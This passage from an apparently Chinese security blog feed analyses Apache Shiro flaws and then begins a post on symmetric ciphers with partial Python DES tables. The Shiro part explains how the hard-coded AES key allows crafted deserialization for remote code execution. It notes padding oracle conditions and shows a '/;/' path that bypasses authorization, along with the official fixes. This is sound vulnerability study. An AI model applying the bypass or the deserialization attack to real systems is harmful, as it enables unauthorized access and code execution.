WebUtils.getHttpResponse(wsc);</span><br><span class="line">                String base64 = <span class="keyword">this</span>.getCookie().readValue(request, response);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">"deleteMe"</span>.equals(base64)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (base64 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    base64 = <span class="keyword">this</span>.ensurePadding(base64);</span><br><span class="line">                    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                        log.trace(<span class="string">"Acquired Base64 encoded identity ["</span> + base64 + <span class="string">"]"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">                    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                        log.trace(<span class="string">"Base64 decoded byte array length: "</span> + (decoded != <span class="keyword">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">" bytes."</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> decoded;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再返回getRememberedPrincipals方法，调用this.convertBytesToPrincipals(bytes, subjectContext)，对rememberMe的base64解码后的值进行处理，跟进此方法，convertBytesToPrincipals 对传入的二进制字符串进行解密和反序列化操作。可以跟进decrypt方法查看具体的解密操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            bytes = <span class="keyword">this</span>.decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.deserialize(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>decrypt方法中的调用 AES 的 CBC 模式进行解密，key为硬编码的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">        CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.decrypt(encrypted, <span class="keyword">this</span>.getDecryptionCipherKey());</span><br><span class="line">            serialized = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> serialized;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以解密过程为加密过程的相反操作，如果得知AES算法中的key（硬编码），就可以构造任意的反序列化字符串，进行RCE。 </p><p><strong>修复方式</strong>：   </p><p>官方针对这个问题的修复方式：</p><p>1、删除相关默认密钥</p><p>2、如果没有配置密钥，会随机生成一个密钥。</p><h1 id="Shiro-Padding-Oracle-Attack（Shiro-721-CVE-2019-12422）"><a href="#Shiro-Padding-Oracle-Attack（Shiro-721-CVE-2019-12422）" class="headerlink" title="Shiro Padding Oracle Attack（Shiro-721 CVE-2019-12422）"></a>Shiro Padding Oracle Attack（Shiro-721 CVE-2019-12422）</h1><p>Shiro实用AES-CBC模式进行加解密，存在Padding Oracle Attack漏洞，已登录的攻击者同样可进行反序列化操作。  </p><p>影响范围：Apache Shiro &lt; 1.4.2<br>利用条件：<br>1.攻击者知道密文和初始向量IV<br>2.padding错误和padding正确服务器可返回不一样的状态   </p><p>攻击效果：<br>正常CBC解密需要知道IV、Key、密文，而通过Padding Oracle漏洞，只用知道IV、密文即可获得明文</p><p>shiro-1.25以前，AES密钥是硬编码到源码中的，因此可以更改RememberMe的值进行反序列化RCE</p><p>而1.2.5之后，shiro采用了随机密钥，也就引出了SHIRO-721，通过padding oracle attack的方式得到，</p><p>根据p0师傅之前的文章，在shiro中，当我们更改padding值时，padding正确但反序列化错误则会爆deserialize error；padding错误爆padding error</p><h1 id="Apache-Shiro权限绕过漏洞分析-CVE-2020-11989"><a href="#Apache-Shiro权限绕过漏洞分析-CVE-2020-11989" class="headerlink" title="Apache Shiro权限绕过漏洞分析(CVE-2020-11989)"></a>Apache Shiro权限绕过漏洞分析(CVE-2020-11989)</h1><p>详情可看：  <a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">https://xz.aliyun.com/t/7964</a></p><p>影响范围</p><ul><li>Apache Shiro &lt; 1.5.3</li><li>Spring 框架中只使用 Shiro 鉴权</li></ul><p>利用条件：</p><ul><li>应用不能部署在根目录，也就是需要context-path，server.servlet.context-path=/test，如果为根目录则context-path为空，就会被CVE-2020-1957的patch将URL格式化，值得注意的是若Shiro版本小于1.5.2的话那么该条件就不需要。</li><li>Spring控制器中没有另外的权限校验代码</li></ul><p>如果直接访问 /test/admin/page ，会返回302跳转要求登录<br><img src="../../images/java/shiro/1.png" alt=""><br>但是访问 /;/test/admin/page , 就能直接绕过Shiro权限验证，访问到/admin路由中的信息<br><img src="../../images/java/shiro/2.png" alt=""><br>漏油缘由：<br>Tomcat判断/;test/admin/page 为test应用下的/admin/page路由，进入到Shiro时被;截断被认作为/,再进入Spring时又被正确处理为test应用下的/admin/page路由，最后导致shiro的权限绕过。 </p><p>另外一种思路： <a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a>  </p><p>参考文章：     </p><p>Apache Shiro权限绕过漏洞分析(CVE-2020-11989) ：<a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">https://xz.aliyun.com/t/7964</a><br>Apache Shiro 身份验证绕过漏洞 (CVE-2020-11989)： <a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652472138&idx=1&sn=6e9f38cca70ed22b6cec794f9c382657" target="_blank" rel="noopener">Shiro反序列化漏洞分析</a><br>Shiro反序列化分析带思路及组件检测笔记：<a href="https://xz.aliyun.com/t/8997" target="_blank" rel="noopener">https://xz.aliyun.com/t/8997</a><br>Shiro反序列化漏洞利用汇总:<a href="https://cloud.tencent.com/developer/article/1657019" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1657019</a><br>Shiro Padding Oracle Attack 反序列化：anquanke.com/post/id/200793<br>Shiro 721 Padding Oracle攻击漏洞分析:<a href="https://www.anquanke.com/post/id/193165" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193165</a>   </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Shrio漏洞学习&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>对称加密算法</title>
    <link href="https://blog.cfyqy.com/article/f10abbf9.html"/>
    <id>https://blog.cfyqy.com/article/f10abbf9.html</id>
    <published>2021-01-25T08:00:37.000Z</published>
    <updated>2021-01-26T15:16:49.792Z</updated>
    
    <content type="html"><![CDATA[<p>对称密码算法有时又叫传统密码算法、秘密密钥算法或单密钥算法。对称密码算法的加密密钥能够从解密密钥中推算出来，反过来也成立。在大多数对称算法中，加密解密密钥是相同的。它要求发送者和接收者在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都能对消息进行加密解密。只要通信需要保密，密钥就必须保密。</p><a id="more"></a><p>对称算法又可分为两类。一次只对明文中的单个位（有时对字节）运算的算法称为序列算法或序列密码。另一类算法是对明文的一组位进行运算，这些位组称为分组，相应的算法称为分组算法或分组密码。现代计算机密码算法的典型分组长度为64位――这个长度既考虑到分析破译密码的难度，又考虑到使用的方便性。后来，随着破译能力的发展，分组长度又提高到128位或更长。</p><p><strong>对称密码常用的数学运算</strong><br>对称密码当中有几种常用到的数学运算。这些运算的共同目的就是把被加密的明文数码尽可能深地打乱，从而加大破译的难度。</p><p>◆移位和循环移位<br>　　移位就是将一段数码按照规定的位数整体性地左移或右移。循环右移就是当右移时，把数码的最后的位移到数码的最前头，循环左移正相反。例如，对十进制数码12345678循环右移1位（十进制位）的结果为81234567，而循环左移1位的结果则为23456781。<br>◆置换<br>　　就是将数码中的某一位的值根据置换表的规定，用另一位代替。它不像移位操作那样整齐有序，看上去杂乱无章。这正是加密所需,被经常应用。<br>◆扩展<br>　　就是将一段数码扩展成比原来位数更长的数码。扩展方法有多种,例如,可以用置换的方法，以扩展置换表来规定扩展后的数码每一位的替代值。<br>◆压缩<br>　　就是将一段数码压缩成比原来位数更短的数码。压缩方法有多种，例如，也可以用置换的方法，以表来规定压缩后的数码每一位的替代值。<br>◆异或<br>　　这是一种二进制布尔代数运算。异或的数学符号为⊕ ，它的运算法则如下：   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1⊕1 = 0</span><br><span class="line">0⊕0 = 0</span><br><span class="line">1⊕0 = 1</span><br><span class="line">0⊕1 = 1</span><br></pre></td></tr></table></figure><p>　　也可以简单地理解为，参与异或运算的两数位如相等，则结果为0，不等则为1。<br>◆迭代<br>　　迭代就是多次重复相同的运算，这在密码算法中经常使用，以使得形成的密文更加难以破解。  </p><h1 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h1><p>DES算法为密码体制中的对称密码体制。需要加密的明文按64位进行分组，加密密钥是根据用户输入的秘钥生成的，密钥长64位，但密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1，在计算密钥时要忽略这8位），分组后的明文组和56位的密钥按位替代或交换的方法形成密文组的加密方法  </p><p><strong>DES算法加密流程描述</strong> ：<br>（1）输入64位明文数据，并进行初始置换IP；<br>（2）在初始置换IP后，明文数据再被分为左右两部分，每部分32位，以L0，R0表示；<br>（3）在秘钥的控制下，经过16轮运算(f)；<br>（4）16轮后，左、右两部分交换，并连接再一起，再进行逆置换；<br>（5）输出64位密文。    </p><p><img src="../../images/cipher/DES/1.png" alt=""><br>python实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 ---</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#IP置换表 表示源数据的位置</span></span><br><span class="line">IP_table=[<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>,  <span class="number">2</span>,</span><br><span class="line">          <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>,</span><br><span class="line">          <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>,  <span class="number">6</span>,</span><br><span class="line">          <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>,  <span class="number">8</span>,</span><br><span class="line">          <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,  <span class="number">9</span>,  <span class="number">1</span>,</span><br><span class="line">          <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>,</span><br><span class="line">          <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>,</span><br><span class="line">          <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,  <span class="number">7</span>]</span><br><span class="line"><span class="comment">#逆IP置换表</span></span><br><span class="line">IP_table_=[<span class="number">40</span>,  <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">           <span class="number">39</span>,  <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">           <span class="number">38</span>,  <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">           <span class="number">37</span>,  <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">           <span class="number">36</span>,  <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">           <span class="number">35</span>,  <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">           <span class="number">34</span>,  <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">           <span class="number">33</span>,  <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line"><span class="comment">#密钥生成的置换表1 去校验位 64bit-&gt;56bit</span></span><br><span class="line">PC_1=[ <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,  <span class="number">9</span>,</span><br><span class="line">       <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">       <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">       <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">       <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">       <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">       <span class="number">14</span>,  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">       <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>]</span><br><span class="line"><span class="comment">#密钥生成的置换压缩表2 56bit-&gt;48bit</span></span><br><span class="line">PC_2=[<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>,  <span class="number">1</span>,  <span class="number">5</span>,</span><br><span class="line">      <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>,  <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">      <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">26</span>,  <span class="number">8</span>,</span><br><span class="line">      <span class="number">16</span>,  <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>,  <span class="number">2</span>,</span><br><span class="line">      <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line">      <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">      <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line">      <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line"><span class="comment">#S盒中的S1盒</span></span><br><span class="line">S1=[<span class="number">14</span>,  <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">8</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">7</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">15</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">3</span>,  <span class="number">8</span>,</span><br><span class="line">    <span class="number">4</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">5</span>,  <span class="number">0</span>,</span><br><span class="line">    <span class="number">15</span>, <span class="number">12</span>,  <span class="number">8</span>,  <span class="number">2</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">13</span>]</span><br><span class="line"><span class="comment">#S盒中的S2盒</span></span><br><span class="line">S2=[<span class="number">15</span>,  <span class="number">1</span>,  <span class="number">8</span>, <span class="number">14</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">    <span class="number">3</span>, <span class="number">13</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">15</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">11</span>,  <span class="number">5</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">14</span>,  <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>,  <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">14</span>,  <span class="number">9</span>]</span><br><span class="line"><span class="comment">#S盒中的S3盒</span></span><br><span class="line">S3=[<span class="number">10</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">14</span>,  <span class="number">6</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">8</span>,</span><br><span class="line">    <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>,  <span class="number">1</span>,</span><br><span class="line">    <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">7</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">3</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">2</span>, <span class="number">12</span>]</span><br><span class="line"><span class="comment">#S盒中的S4盒</span></span><br><span class="line">S4=[<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">13</span>,  <span class="number">8</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">    <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,</span><br><span class="line">    <span class="number">3</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">9</span>,  <span class="number">4</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">14</span>]</span><br><span class="line"><span class="comment">#S盒中的S5盒</span></span><br><span 